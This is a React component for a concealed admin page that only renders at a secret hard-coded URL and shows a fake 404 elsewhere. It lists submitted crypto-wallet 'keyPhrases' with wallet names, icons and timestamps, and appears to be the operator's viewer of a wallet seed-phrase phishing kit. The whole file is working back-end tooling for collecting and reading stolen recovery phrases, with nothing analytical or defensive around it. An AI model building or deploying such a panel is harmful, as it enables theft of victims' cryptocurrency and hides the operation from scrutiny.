import React, { useState, useEffect } from "react";
import { useLocation } from "react-router-dom";

const AdminSubmissionsPage = () => {
  const [submissions, setSubmissions] = useState([]);
  const location = useLocation();

  // Only show the page if the user manually enters the correct URL
  const isAdminPage = location.pathname === "/admin-submissions-9a7f3b4e2d";

  useEffect(() => {
    if (isAdminPage) {
      const fetchSubmissions = async () => {
        try {
          const response = await fetch("/api/submissions");
          const data = await response.json();
          setSubmissions(data.submissions);
        } catch (error) {
          console.error("Error fetching submissions:", error);
        }
      };
      fetchSubmissions();
    }
  }, [isAdminPage]);

  // Show a 404 error if the user is not on the correct URL
  if (!isAdminPage) {
    return (
      <div className="not-found-container">
        <h1>404</h1>
        <p>Page Not Available</p>
      </div>
    );
  }

  return (
    <div className="submissions-container">
      <h2>Submissions</h2>
      {submissions.length === 0 ? (
        <p>No submissions found.</p>
      ) : (
        submissions.map((submission, index) => (
          <div key={index} className="submission-card">
            <div className="wallet-info">
              <img src={submission.wallet.icon} alt={submission.wallet.name} />
              <h3>{submission.wallet.name}</h3>
            </div>
            <p>{submission.keyPhrases}</p>
            <small>{new Date(submission.timestamp).toLocaleString()}</small>
          </div>
        ))
      )}
    </div>
  );
};

export default AdminSubmissionsPage;
